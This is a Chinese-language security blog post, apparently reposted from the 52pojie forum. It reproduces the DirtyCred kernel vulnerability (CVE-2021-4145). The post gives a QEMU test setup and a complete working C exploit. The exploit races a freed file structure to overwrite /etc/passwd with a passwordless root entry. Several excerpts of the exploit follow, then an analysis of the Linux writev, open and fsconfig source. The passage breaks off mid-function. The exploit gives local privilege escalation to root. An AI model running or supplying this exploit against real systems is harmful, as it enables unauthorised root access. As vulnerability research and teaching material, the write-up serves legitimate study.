---
cve: "CVE-2021-4145"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【漏洞分析】CVE-2021-4145 dirty cred漏洞复现   
原创 吾爱pojie  吾爱破解论坛   2024-03-16 09:25  
  
**作者****论****坛账号：xia0ji233**  
  
  
复现一下 dirty cred 漏洞  
  
<!--more-->  
  
同样本篇文章采用的还是 环境配置——漏洞验证——源码分析——代码调试 这四部分。  
## 环境配置  
### 内核编译  
  
选用一个漏洞存在的版本，例如 5.13.2。  
  
下面就是编译内核会踩得一些坑，我将完整复述一遍：  
  
源码下载好之后，先 make menuconfig 开启调试符号，kernel hacking->kernel debugging 勾选，kernel hacking->Compile-time checks and compiler options->Compile the kernel with debug info 勾选。  
  
保存退出之后还需要加上两个选项。  
  
vim .config，打开之后找到两个选项，一个是 CONFIG_FUSE_FS 另一个是 CONFIG_USER_NS，这两个选项都需要启动，默认生成的 config 应该是没有启用这两个选项的。  
  
配置完成之后就可以开始编译了。  
  
编译完成之后，在本目录下得到带完整符号的 vmlinux，在 arch/x86/boot/ 得到启动内核 bzImage  
### 文件系统编译  
  
依然是采用 busybox，方法和之前是一致的，看我最开始的环境搭建即可，这里可以提前把 EXP 编译进去然后打包文件系统。  
### 启动脚本  
  
就是传说中的 start.sh  
  
这里给大家参考一下我的 qemu 启动参数。  
```
qemu-system-x86_64 \
        -m 256M \
        -smp 2,cores=2,threads=1\
        -kernel ./bzImage \
        -initrd  ./rootfs.img \
        -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr"\
        -cpu qemu64 \
        -netdev user,id=t0, \
        -device e1000,netdev=t0,id=nic0 \
        -nographic \
        #-s -S\
```  
  
最后一行用于调试，大家不需要调试可以先注释掉，其它参数解释如下：  
1. -m 256M: 指定虚拟机的内存大小为 256MB。  
  
1. -smp 2,cores=2,threads=1: 指定使用 2 个 CPU，每个 CPU 拥有 2 个核心，每个核心只有一个线程。  
  
1. -kernel ./bzImage: 指定了内核文件。  
  
1. -initrd ./rootfs.img: 指定我们制作的 Linux 文件系统。  
  
1. -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr":指定了传递给内核的启动参数。这里的 quiet 可以让内核不输出很多信息直接启动，nokaslr 一定要加，否则断点无法命中。  
  
1. -cpu qemu64: 指定使用 QEMU 的默认 x86_64 CPU 模拟器。  
  
1. -netdev user,id=t0,: 指定了用户模式网络设备。  
  
1. -device e1000,netdev=t0,id=nic0: 指定了要添加到虚拟机的网络设备。  
  
1. -nographic: 无需图形界面的情况下运行 QEMU。  
  
现在在目录下应该有了 start.sh，bzImage 和 rootfs.img，文件系统可以提前打包 exp 进去。  
## 漏洞验证  
### EXP验证  
  
用网上通用的一个 EXP。  
```
#define _GNU_SOURCE

#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <assert.h>
#include <pthread.h>
#include <sys/uio.h>

#include <linux/bpf.h>
#include <linux/kcmp.h>

#include <linux/capability.h>

static void die(const char *fmt, ...) {
    va_list params;

    va_start(params, fmt);
    vfprintf(stderr, fmt, params);
    va_end(params);
    exit(1);
}

static void use_temporary_dir(void) {
    system("rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data");
    char *tmpdir = "exp_dir";
    if (!tmpdir)
        exit(1);
    if (chmod(tmpdir, 0777))
        exit(1);
    if (chdir(tmpdir))
        exit(1);
}

static bool write_file(const char *file, const char *what, ...) {
    char buf[1024];
    va_list args;
    va_start(args, what);
    vsnprintf(buf, sizeof(buf), what, args);
    va_end(args);
    buf[sizeof(buf) - 1] = 0;
    int len = strlen(buf);
    int fd = open(file, O_WRONLY | O_CLOEXEC);
    if (fd == -1)
        return false;
    if (write(fd, buf, len) != len) {
        int err = errno;
        close(fd);
        errno = err;
        return false;
    }
    close(fd);
    return true;
}

static void setup_common() {
    if (mount(0, "/sys/fs/fuse/connections", "fusectl", 0, 0)) {

    }
}

static void loop();

static void sandbox_common() {
    prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
    setsid();
    struct rlimit rlim;
    rlim.rlim_cur = rlim.rlim_max = (200 << 20);
    setrlimit(RLIMIT_AS, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 32 << 20;
    setrlimit(RLIMIT_MEMLOCK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 136 << 20;
    setrlimit(RLIMIT_FSIZE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 1 << 20;
    setrlimit(RLIMIT_STACK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 256;
    setrlimit(RLIMIT_NOFILE, &rlim);
    if (unshare(CLONE_NEWNS)) {
    }
    if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL)) {
    }
    if (unshare(CLONE_NEWIPC)) {
    }
    if (unshare(0x02000000)) {
    }
    if (unshare(CLONE_NEWUTS)) {
    }
    if (unshare(CLONE_SYSVSEM)) {
    }
    typedef struct {
        const char *name;
        const char *value;
    } sysctl_t;
    static const sysctl_t sysctls[] = {
        {"/proc/sys/kernel/shmmax", "16777216"},
        {"/proc/sys/kernel/shmall", "536870912"},
        {"/proc/sys/kernel/shmmni", "1024"},
        {"/proc/sys/kernel/msgmax", "8192"},
        {"/proc/sys/kernel/msgmni", "1024"},
        {"/proc/sys/kernel/msgmnb", "1024"},
        {"/proc/sys/kernel/sem", "1024 1048576 500 1024"},
    };
    unsigned i;
    for (i = 0; i < sizeof(sysctls) / sizeof(sysctls[0]); i++)
        write_file(sysctls[i].name, sysctls[i].value);
}

static int wait_for_loop(int pid) {
    if (pid < 0)
        exit(1);
    int status = 0;
    while (waitpid(-1, &status, __WALL) != pid) {
    }
    return WEXITSTATUS(status);
}

static void drop_caps(void) {
    struct __user_cap_header_struct cap_hdr = {};
    struct __user_cap_data_struct cap_data[2] = {};
    cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;
    cap_hdr.pid = getpid();
    if (syscall(SYS_capget, &cap_hdr, &cap_data))
        exit(1);
    const int drop = (1 << CAP_SYS_PTRACE) | (1 << CAP_SYS_NICE);
    cap_data[0].effective &= ~drop;
    cap_data[0].permitted &= ~drop;
    cap_data[0].inheritable &= ~drop;
    if (syscall(SYS_capset, &cap_hdr, &cap_data))
        exit(1);
}

static int real_uid;
static int real_gid;
__attribute__((aligned(64 << 10))) static char sandbox_stack[1 << 20];

static int namespace_sandbox_proc() {
    sandbox_common();
    loop();
}

static int do_sandbox_namespace() {
    setup_common();
    real_uid = getuid();
    real_gid = getgid();
    mprotect(sandbox_stack, 4096, PROT_NONE);
    while (1) {
        int pid =
            clone(namespace_sandbox_proc, &sandbox_stack[sizeof(sandbox_stack) - 64],
                  CLONE_NEWUSER | CLONE_NEWPID, 0);
        if (pid == -1) {
            perror("clone");
            printf("errno: %d\n", errno);
        }
        int ret_status = wait_for_loop(pid);
        if (ret_status == 0) {
            printf("[!] succeed\n");
            sleep(1);
            printf(" checking /etc/passwd\n\n");
            printf(" executing command : head -n 5 /etc/passwd\n");
            sleep(1);
            system("head -n 5 /etc/passwd");
            return 1;
        } else {
            printf("[-] failed to write, retry...\n\n");
            sleep(3);
        }
    }
}

// ===========================

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#define MAX_FILE_NUM 1000
int uaf_fd;
int fds[MAX_FILE_NUM];

int run_write = 0;
int run_spray = 0;
char *cwd;

void *slow_write() {
    printf("start slow write to get the lock\n");    int fd = open("./uaf", 1);

    if (fd < 0) {
        perror("error open uaf file");
        exit(-1);
    }

    unsigned long int addr = 0x30000000;
    int offset;
    for (offset = 0; offset < 0x80000; offset++) {
        void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,
                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
        if (r < 0) {
            printf("allocate failed at 0x%x\n", offset);
        }
    }

    assert(offset > 0);

    void *mem = (void *)(addr);
    memcpy(mem, "hhhhh", 5);

    struct iovec iov[5];
    for (int i = 0; i < 5; i++) {
        iov[i].iov_base = mem;
        iov[i].iov_len = (offset - 1) * 0x1000;
    }

    run_write = 1;
    if (writev(fd, iov, 5) < 0) {
        perror("slow write");
    }
    printf("write done!\n");}

void *write_cmd() {
    char data[1024] = "root::0:0:root:/root:/bin/sh\n\n";
    struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};

    while (!run_write) {
    }
    run_spray = 1;
    if (writev(uaf_fd, &iov, 1) < 0) {
        printf("failed to write\n");
    }
    printf("overwrite done! It should be after the slow write\n");}

int spray_files() {

    while (!run_spray) {
    }
    int found = 0;

    printf("got uaf fd %d, start spray....\n", uaf_fd);    for (int i = 0; i < MAX_FILE_NUM; i++) {
        fds[i] = open("/etc/passwd", O_RDONLY);
        if (fds[i] < 0) {
            perror("open file");
            printf("%d\n", i);
        }
        if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==
            0) {
            found = 1;
            printf("[!] found, file id %d\n", i);
            for (int j = 0; j < i; j++)
                close(fds[j]);
            break;
        }
    }

    if (found) {
        sleep(4);
        return 0;
    }
    return -1;
}

void trigger() {
    int fs_fd = syscall(__NR_fsopen, "cgroup", 0);
    if (fs_fd < 0) {
        perror("fsopen");
        die("");
    }

    symlink("./data", "./uaf");

    uaf_fd = open("./uaf", 1);
    if (uaf_fd < 0) {
        die("failed to open symbolic file\n");
    }

    if (syscall(__NR_fsconfig, fs_fd, 5, "source", 0, uaf_fd)) {
        perror("fsconfig");
        exit(-1);
    }
    // free the uaf fd
    close(fs_fd);
}

void loop() {
    trigger();

    pthread_t p_id;
    pthread_create(&p_id, NULL, slow_write, NULL);

    pthread_t p_id_cmd;
    pthread_create(&p_id_cmd, NULL, write_cmd, NULL);
    exit(spray_files());
}

int main(void) {
    cwd = get_current_dir_name();
    syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
    syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
    syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
    use_temporary_dir();
    do_sandbox_namespace();
    return 0;
}
```  
  
编译命令为 gcc -g exp.c -o exp -static -lpthread  
  
这里我很简单地将 /etc/passwd 的第一项写成 root::0:0:root:/root:/bin/sh\n\n，去掉其中的 x 让它没有密码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKLrWW7Tu4GunpcnI8hGt1DfXlY3tJAibzlVtiauUO4FzALSYRyXoVGNBQ/640?wx_fmt=png&from=appmsg "")  
  
可以发现漏洞是存在的。  
### 原理概述  
  
通过阅读 论文原文 能大概知道 EXP 的利用思路。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKM6ZYVOPuibj4rjpdVrBmAlZAHsKagh2jZA8HzZRCd7Xibkkf0iaibibzVuw/640?wx_fmt=png&from=appmsg "")  
  
步骤是先打开一个具有写权限的本地文件，对其写入内容，在写文件的时候，内核会检查你的权限，随后再去写，在检查完权限，写之前可以 free 掉这个文件再立马打开特权文件（/etc/passwd），这样就可以达到绕过权限去写特权文件的操作了。  
  
配合 EXP 来看看  
### EXP分析  
  
从 main 函数开始，先调用 3 次 mmap 去分配内存，随后新建了一个 exp_dir 文件夹，并创建了 data 在该文件夹中。  
### do_sandbox_namespace  
  
setup_common 函数挂载了一个 FUSE 文件系统，但是测试下来挂载不成功也不影响 EXP 的使用，随后 mprotect 改变内存属性（这里不是很清楚为什么把栈的属性清零）。随后循环  
  
在循环中调用 clone 去启动一个新的进程，一般来说，clone 理解为 fork 没有问题。随后子进程执行 namespace_sandbox_proc，主进程等待子进程返回，那么来分析分析这个函数。  
#### sandbox_common  
  
先设置父进程死亡的信号为 SIGKILL，然后调用 setsid() 去脱离当前终端。随后做了一系列的限制，分别为  
- 地址空间限制（RLIMIT_AS）：限制了进程的虚拟内存空间大小为 200MB。  
  
- 锁定内存限制（RLIMIT_MEMLOCK）：限制了进程锁定内存的大小为 32MB。  
  
- 文件大小限制（RLIMIT_FSIZE）：限制了进程可以创建的文件大小为 136MB。  
  
- 栈大小限制（RLIMIT_STACK）：限制了进程的栈大小为 1MB。  
  
- 核心文件大小限制（RLIMIT_CORE）：禁止了进程生成核心转储文件。  
  
- 打开文件描述符数量限制（RLIMIT_NOFILE）：限制了进程可以打开的文件描述符数量为 256。  
  
然后挂载创建一个新的命名空间，将当前命名空间的根文件系统挂载点设置为私有，再创建其它的一系列的命名空间。  
  
随后写这些内核参数文件，这样就创建了一个合适的环境。  
#### loop  
##### trigger  
  
fsopen 打开一个文件系统 cgroup，将 ./uaf 链接到 ./data 上，又使用 fsconfig 进行了一些配置，在这个地方已经产生了 UAF 漏洞。  
  
然后开启了两个线程分别启动 slow_write 和 write_cmd，主线程调用 spray_files。分别对应论文第一张图的线程 1，2，3。  
  
那么可以发现，主要就是由这三个线程去操作了，之前一系列是为了进行一个环境配置在造成 UAF，因为并没有权限直接更改内核的某些参数，所以直接创建新的命名空间去操作的。  
##### slow_write  
```
void *slow_write() {
    printf("start slow write to get the lock\n");    int fd = open("./uaf", 1);

    if (fd < 0) {
        perror("error open uaf file");
        exit(-1);
    }

    unsigned long int addr = 0x30000000;
    int offset;
    for (offset = 0; offset < 0x80000; offset++) {
        void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,
                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
        if (r < 0) {
            printf("allocate failed at 0x%x\n", offset);
        }
    }

    assert(offset > 0);

    void *mem = (void *)(addr);
    memcpy(mem, "hhhhh", 5);

    struct iovec iov[5];
    for (int i = 0; i < 5; i++) {
        iov[i].iov_base = mem;
        iov[i].iov_len = (offset - 1) * 0x1000;
    }

    run_write = 1;
    if (writev(fd, iov, 5) < 0) {
        perror("slow write");
    }
    printf("write done!\n");}
```  
  
打开文件去占据内核锁，去打开 ./uaf，至于为什么打开 uaf，稍后分析内核源码可以获得具体原因。  
  
这里面还分配了大量内存页，并尝试将所有页面写入文件，这一步通过文献的查阅可以得知是为了减缓写文件的速度，把写文件的时间线拉长就可以提高漏洞利用的成功率。  
  
中间在开始写之前会设置一个全局变量去启动下一个线程。  
#### write_cmd  
```
void *write_cmd() {
    char data[1024] = "root::0:0:root:/root:/bin/sh\n\n";
    struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};

    while (!run_write) {
    }
    run_spray = 1;
    if (writev(uaf_fd, &iov, 1) < 0) {
        printf("failed to write\n");
    }
    printf("overwrite done! It should be after the slow write\n");}
```  
  
这一步就是等到第一个线程调用 writev 的时候启动第三个线程，然后再去写指定的数据。  
#### spray_files  
```
int spray_files() {

    while (!run_spray) {
    }
    int found = 0;

    printf("got uaf fd %d, start spray....\n", uaf_fd);    for (int i = 0; i < MAX_FILE_NUM; i++) {
        fds[i] = open("/etc/passwd", O_RDONLY);
        if (fds[i] < 0) {
            perror("open file");
            printf("%d\n", i);
        }
        if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==
            0) {
            found = 1;
            printf("[!] found, file id %d\n", i);
            for (int j = 0; j < i; j++)
                close(fds[j]);
            break;
        }
    }

    if (found) {
        sleep(4);
        return 0;
    }
    return -1;
}
```  
  
连续地打开 /etc/passwd 文件，判断文件描述符和 uaf_fd 是否为同一文件，如果是那么设置 found=1。  
  
在这个地方触发了漏洞导致了 uaf 文件描述符写入了 /etc/passwd 文件。  
## 源码分析  
  
选用对应源码版本：https://elixir.bootlin.com/linux/v5.13.3/source  
### open  
  
在利用中线程 1 （局部变量 fd）和线程 2 （全局变量 uaf_fd）都打开了一个文件（./uaf），如果 uaf 是普通文件，那么 FMODE_ATOMIC_POS 这个标志位必定存在，但是如果是链接文件，则这里不会被设置这个标记，可以避免被卡在这个函数。  
  
具体的代码可以查看 open 函数的调用，相关解释已加注释。  
```
static int do_dentry_open(struct file *f,
                          struct inode *inode,
                          int (*open)(struct inode *, struct file *))
{
    static const struct file_operations empty_fops = {};
    int error;

    path_get(&f->f_path);
    f->f_inode = inode;
    f->f_mapping = inode->i_mapping;
    f->f_wb_err = filemap_sample_wb_err(f->f_mapping);
    f->f_sb_err = file_sample_sb_err(f);

    if (unlikely(f->f_flags & O_PATH)) {
        f->f_mode = FMODE_PATH | FMODE_OPENED;
        f->f_op = &empty_fops;
        return 0;
    }

    if (f->f_mode & FMODE_WRITE && !special_file(inode->i_mode)) {
        error = get_write_access(inode);
        if (unlikely(error))
            goto cleanup_file;
        error = __mnt_want_write(f->f_path.mnt);
        if (unlikely(error)) {
            put_write_access(inode);
            goto cleanup_file;
        }
        f->f_mode |= FMODE_WRITER;
    }

    /* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */
    if (S_ISREG(inode->i_mode) || S_ISDIR(inode->i_mode))
        f->f_mode |= FMODE_ATOMIC_POS;
//这里可以看到，如果打开的文件是目录（DIR）类型或者是常规（REG）类型的文件，则必定加上一个 FMODE_ATOMIC_POS 标记，因此需要通过建立链接来绕过
    f->f_op = fops_get(inode->i_fop);
    if (WARN_ON(!f->f_op)) {
        error = -ENODEV;
        goto cleanup_all;
    }
//...这里省略了很多代码
cleanup_all:
    if (WARN_ON_ONCE(error > 0))
        error = -EINVAL;
    fops_put(f->f_op);
    if (f->f_mode & FMODE_WRITER) {
        put_write_access(inode);
        __mnt_drop_write(f->f_path.mnt);
    }
cleanup_file:
    path_put(&f->f_path);
    f->f_path.mnt = NULL;
    f->f_path.dentry = NULL;
    f->f_inode = NULL;
    return error;
}
```  
### writev  
  
主要要分析的是 sys_writev。  
```
SYSCALL_DEFINE3(writev, unsigned long, fd, const struct iovec __user *, vec,
                unsigned long, vlen)
{
    return do_writev(fd, vec, vlen, 0);
}
```  
  
深入这个函数来看看  
```
static ssize_t do_writev(unsigned long fd, const struct iovec __user *vec,
                         unsigned long vlen, rwf_t flags)
{
    struct fd f = fdget_pos(fd);
    ssize_t ret = -EBADF;

    if (f.file) {
        loff_t pos, *ppos = file_ppos(f.file);
        if (ppos) {
            pos = *ppos;
            ppos = &pos;
        }
        ret = vfs_writev(f.file, vec, vlen, ppos, flags);
        if (ret >= 0 && ppos)
            f.file->f_pos = pos;
        fdput_pos(f);
    }

    if (ret > 0)
        add_wchar(current, ret);
    inc_syscw(current);
    return ret;
}
```  
  
看起来其实非常简单，也就是先根据文件描述符去获取 fd 结构，fd 结构里面维护了当前打开的文件的写指针和读指针，第一步先获取，然后调用 vfs_writev 去写该文件，随后释放文件结构，如果返回值 >0，则增加当前文件写入字符数（add_wchar），增加当前系统调用次数（inc_syscw）  
  
同样从头到尾来看看函数定义，首先是这个获取文件结构的 fdget_pos，  
```
static inline struct fd fdget_pos(int fd)
{
    return __to_fd(__fdget_pos(fd));
}
```  
  
然后再深入看看 __to_fd 和 __fget_pos 函数。  
```
static inline struct fd __to_fd(unsigned long v)
{
    return (struct fd){(struct file *)(v & ~3),v & 3};
}
```  
  
无疑 __to_fd 函数将获得的文件结构 struct file 转为 struct fd。  
  
__fdget_pos 就应当是根据文件描述符来获取文件结构 struct file。  
```
unsigned long __fdget_pos(unsigned int fd)
{
    unsigned long v = __fdget(fd);
    struct file *file = (struct file *)(v & ~3);

    if (file && (file->f_mode & FMODE_ATOMIC_POS)) {
        if (file_count(file) > 1) {
            v |= FDPUT_POS_UNLOCK;
            mutex_lock(&file->f_pos_lock);
        }
    }
    return v;
}
```  
  
深入下去 __fdget 可以发现里面调用了 __fget_light，第二个参数被固定为 FMODE_PATH，对于这个函数定义：  
```
/* File is opened with O_PATH; almost nothing can be done with it */
#define FMODE_PATH                ((__force fmode_t)0x4000)
unsigned long __fdget(unsigned int fd)
{
        return __fget_light(fd, FMODE_PATH);
}
/* * Lightweight file lookup - no refcnt increment if fd table isn't shared. * * You can use this instead of fget if you satisfy all of the following * conditions: * 1) You must call fput_light before exiting the syscall and returning control *    to userspace (i.e. you cannot remember the returned struct file * after *    returning to userspace). * 2) You must not call filp_close on the returned struct file * in between *    calls to fget_light and fput_light. * 3) You must not clone the current task in between the calls to fget_light *    and fput_light. * * The fput_needed flag returned by fget_light should be passed to the * corresponding fput_light. */
static unsigned long __fget_light(unsigned int fd, fmode_t mask)
{
    struct files_struct *files = current->files;
    struct file *file;

    if (atomic_read(&files->count) == 1) {
        file = files_lookup_fd_raw(files, fd);
        if (!file || unlikely(file->f_mode & mask))
            return 0;
        return (unsigned long)file;
    } else {
        file = __fget(fd, mask, 1);
        if (!file)
            return 0;
        return FDPUT_FPUT | (unsigned long)file;
    }
}

```  
  
这里也解释了这个宏的定义，表示文件几乎不能做任何操作比如说 READ,WRITE，而这里的 mask 在后面分析是禁止的一些操作，比如文件具有 READ 权限但是 mask 被设置为 FMODE_READ，那么在后续的调用中会返回 NULL。  
  
先获取当前进程的文件描述符表（current->files），然后判断文件描述符表的引用计数是否为 1 （描述符表是否共享），如果是则调用 files_lookup_fd_raw 去获取文件结构指针，然后判断文件操作模式的正确性，随后返回。  
```
/* * The caller must ensure that fd table isn't shared or hold rcu or file lock */
static inline struct file *files_lookup_fd_raw(struct files_struct *files, unsigned int fd)
{
    struct fdtable *fdt = rcu_dereference_raw(files->fdt);

    if (fd < fdt->max_fds) {
        fd = array_index_nospec(fd, fdt->max_fds);
        return rcu_dereference_raw(fdt->fd[fd]);
    }
    return NULL;
}
```  
  
根据注释也可以认为，需要保证文件描述符表没有被共享过，或者是持有文件锁。会返回一个 fd 表中的 struct file 结构（fdt->fd[fd]）。  
  
如果引用计数不为 1，则调用 __fget 去获取指针，其中主要是调用了 __fget_files 函数。  
```
#define get_file_rcu_many(x, cnt)        \        atomic_long_add_unless(&(x)->f_count, (cnt), 0)
static struct file *__fget_files(struct files_struct *files, unsigned int fd,
                                 fmode_t mask, unsigned int refs)
{
    struct file *file;
    rcu_read_lock();
loop:
    file = files_lookup_fd_rcu(files, fd);
    if (file) {
        /* File object ref couldn't be taken.                 * dup2() atomicity guarantee is the reason                 * we loop to catch the new file (or NULL pointer)                 */
        if (file->f_mode & mask)
            file = NULL;
        else if (!get_file_rcu_many(file, refs))
            goto loop;
    }
    rcu_read_unlock();

    return file;
}
static inline struct file *__fget(unsigned int fd, fmode_t mask,
                                  unsigned int refs)
{
    return __fget_files(current->files, fd, mask, refs);
}

```  
  
这里的 files_lookup_fd_rcu 直接可以认为是获取文件结构体的，随后判断里面是否包含禁止的模式，然后增加文件计数引用 （get_file_rcu_many）。  
  
回过头来看看 __fdget_pos 函数  
```
unsigned long __fdget_pos(unsigned int fd)
{
    unsigned long v = __fdget(fd);
    struct file *file = (struct file *)(v & ~3);

    if (file && (file->f_mode & FMODE_ATOMIC_POS)) {
        if (file_count(file) > 1) {
            v |= FDPUT_POS_UNLOCK;
            mutex_lock(&file->f_pos_lock);
        }
    }
    return v;
}
```  
  
获取到的文件指针将最低两位置为 0（对齐），如果被设置了 FMODE_ATOMIC_POS 且 文件引用大于 1，那么上锁，到这里，才分析完 do_writev 的第一句话，来看看接下来的语句，重点是 vfs_writev 函数。  
```
static ssize_t do_iter_write(struct file *file, struct iov_iter *iter,
                loff_t *pos, rwf_t flags)
{
        size_t tot_len;
        ssize_t ret = 0;

        if (!(file->f_mode & FMODE_WRITE))
                return -EBADF;
        if (!(file->f_mode & FMODE_CAN_WRITE))
                return -EINVAL;

        tot_len = iov_iter_count(iter);
        if (!tot_len)
                return 0;
        ret = rw_verify_area(WRITE, file, pos, tot_len);
        if (ret < 0)
                return ret;

        if (file->f_op->write_iter)
                ret = do_iter_readv_writev(file, iter, pos, WRITE, flags);
        else
                ret = do_loop_readv_writev(file, iter, pos, WRITE, flags);
        if (ret > 0)
                fsnotify_modify(file);
        return ret;
}

static ssize_t vfs_writev(struct file *file, const struct iovec __user *vec,
                          unsigned long vlen, loff_t *pos, rwf_t flags)
{
    struct iovec iovstack[UIO_FASTIOV];
    struct iovec *iov = iovstack;
    struct iov_iter iter;
    ssize_t ret;

    ret = import_iovec(WRITE, vec, vlen, ARRAY_SIZE(iovstack), &iov, &iter);
    if (ret >= 0) {
        file_start_write(file);
        ret = do_iter_write(file, &iter, pos, flags);
        file_end_write(file);
        kfree(iov);
    }
    return ret;
}
```  
  
首先根据 writev 的结构体解出数据和长度，然后调用 do_iter_write 去写文件，而在 do_iter_write 中可以发现，这里作权限校验了，校验了是否可写以及文件描述符是否可写，这里的两层意思分别是文件本身是否具有可写权限以及你打开的文件描述符是否包含了 O_WRITE 权限位。  
  
随后进行写，写的过程会根据文件系统调用对应的写函数（write_iter）  
```
static inline ssize_t call_write_iter(struct file *file, struct kiocb *kio,
                                      struct iov_iter *iter)
{
    return file->f_op->write_iter(kio, iter);
}
```  
  
下面是完整的调用链，感兴趣可以跟一下。  
  
do_writev->vfs_writev->do_iter_write->do_iter_readv_writev->call_write_iter->.write_iter -> ext4_file_write_iter -> ext4_buffered_write_iter  
  
在这个函数里面可以看到我注释的两个位置分别对文件节点进行了上锁和解锁。  
```
static ssize_t
    ext4_file_write_iter(struct kiocb *iocb, struct iov_iter *from)
{
    struct inode *inode = file_inode(iocb->ki_filp);

    if (unlikely(ext4_forced_shutdown(EXT4_SB(inode->i_sb))))
        return -EIO;

#ifdef CONFIG_FS_DAX
    if (IS_DAX(inode))
        return ext4_dax_write_iter(iocb, from);
#endif
    if (iocb->ki_flags & IOCB_DIRECT)
        return ext4_dio_write_iter(iocb, from);
    else
        return ext4_buffered_write_iter(iocb, from);
}
static ssize_t ext4_buffered_write_iter(struct kiocb *iocb,
                                        struct iov_iter *from)
{
    ssize_t ret;
    struct inode *inode = file_inode(iocb->ki_filp);

    if (iocb->ki_flags & IOCB_NOWAIT)
        return -EOPNOTSUPP;

    ext4_fc_start_update(inode);
    inode_lock(inode);//这里会上锁
    ret = ext4_write_checks(iocb, from);
    if (ret <= 0)
        goto out;

    current->backing_dev_info = inode_to_bdi(inode);
    ret = generic_perform_write(iocb->ki_filp, from, iocb->ki_pos);
    current->backing_dev_info = NULL;

    out:
    inode_unlock(inode);//这里会解锁
    ext4_fc_stop_update(inode);
    if (likely(ret > 0)) {
        iocb->ki_pos += ret;
        ret = generic_write_sync(iocb, ret);
    }

    return ret;
}
```  
  
此时两个线程会卡在这个锁里，翻一翻时间节点，此时权限校验已经完了，第一个线程写入大量数据将第二个线程获取锁的时间，趁此机会第三个线程将 /etc/passwd 打开并将文件页面以这个 uaf 的页面使用，第二个线程获取锁之后直接将数据写入 /etc/passwd。  
  
所以要彻底明白这个漏洞，还需要理解前面 UAF 的成因。  
### fsconfig  
  
这个系统调用太大了，只介绍它原有的含义和触发漏洞的位置。  
```
SYSCALL_DEFINE5(fsconfig,
                int, fd,
                unsigned int, cmd,
                const char __user *, _key,
                const void __user *, _value,
                int, aux)
{
    struct fs_context *fc;
    struct fd f;
    int ret;
    int lookup_flags = 0;

    struct fs_parameter param = {
        .type        = fs_value_is_undefined,
    };

    if (fd < 0)
        return -EINVAL;

    switch (cmd) {
        case FSCONFIG_SET_FLAG:
            if (!_key || _value || aux)
                return -EINVAL;
            break;
        case FSCONFIG_SET_STRING:
            if (!_key || !_value || aux)
                return -EINVAL;
            break;
        case FSCONFIG_SET_BINARY:
            if (!_key || !_value || aux <= 0 || aux > 1024 * 1024)
                return -EINVAL;
            break;
        case FSCONFIG_SET_PATH:
        case FSCONFIG_SET_PATH_EMPTY:
            if (!_key || !_value || (aux != AT_FDCWD && aux < 0))
                return -EINVAL;
            break;
        case FSCONFIG_SET_FD:
            if (!_key || _value || aux < 0)
                return -EINVAL;
            break;
        case FSCONFIG_CMD_CREATE:
        case FSCONFIG_CMD_RECONFIGURE:
            if (_key || _value || aux)
                return -EINVAL;
            break;
        default:
            return -EOPNOTSUPP;
    }

    f = fdget(fd);
    if (!f.file)
        return -EBADF;
    ret = -EINVAL;
    if (f.file->f_op != &fscontext_fops)
        goto out_f;

    fc = f.file->private_data;
    if (fc->ops == &legacy_fs_context_ops) {
        switch (cmd) {
            case FSCONFIG_SET_BINARY:
            case FSCONFIG_SET_PATH:
            case FSCONFIG_SET_PATH_EMPTY:
            case FSCONFIG_SET_FD:
                ret = -EOPNOTSUPP;
                goto out_f;
        }
    }

    if (_key) {
        param.key = strndup_user(_key, 256);
        if (IS_ERR(param.key)) {
            ret = PTR_ERR(param.key);
            goto out_f;
        }
    }

    switch (cmd) {
        case FSCONFIG_SET_FLAG:
            param.type = fs_value_is_flag;
            break;
        case FSCONFIG_SET_STRING:
            param.type = fs_value_is_string;
            param.string = strndup_user(_value, 256);
            if (IS_ERR(param.string)) {
                ret = PTR_ERR(param.string);
                goto out_key;
            }
            param.size = strlen(param.string);
            break;
        case FSCONFIG_SET_BINARY:
            param.type = fs_value_is_blob;
            param.size = aux;
            param.blob = memdup_user_nul(_value, aux);
            if (IS_ERR(param.blob)) {
                ret = PTR_ERR(param.blob);
                goto out_key;
            }
            break;
        case FSCONFIG_SET_PATH_EMPTY:
            lookup_flags = LOOKUP_EMPTY;
            fallthrough;
        case FSCONFIG_SET_PATH:
            param.type = fs_value_is_filename;
